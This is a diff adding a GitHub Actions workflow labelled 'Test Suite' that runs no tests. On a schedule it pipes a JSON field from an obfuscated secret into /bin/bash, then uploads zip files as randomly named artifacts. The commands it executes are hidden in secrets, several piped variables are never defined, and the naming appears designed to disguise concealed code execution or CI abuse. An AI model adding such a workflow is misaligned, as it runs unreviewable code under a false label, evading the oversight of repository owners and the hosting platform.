@@ -1,0 +1,41 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '57 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Execute
+        env:
+          gnf12: ${{ secrets.gnf12 }}
+        run: |
+          printf '%s' "$gnf12" | jq -r .mykq4425 | /bin/bash
+          printf '%s' "$iiyl6" | jq -r .m0840 | /bin/bash
+          printf '%s' "$cypx0160" | jq -r .wisg87 | /bin/bash
+          printf '%s' "$vweo75879" | jq -r .cqble103 | /bin/bash
+          echo $cu3 | jq -r .kvk93 | /bin/bash
+
+      - name: Upload artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: dzI8Wn3G
+          path: "*.zip"
+          retention-days: 1
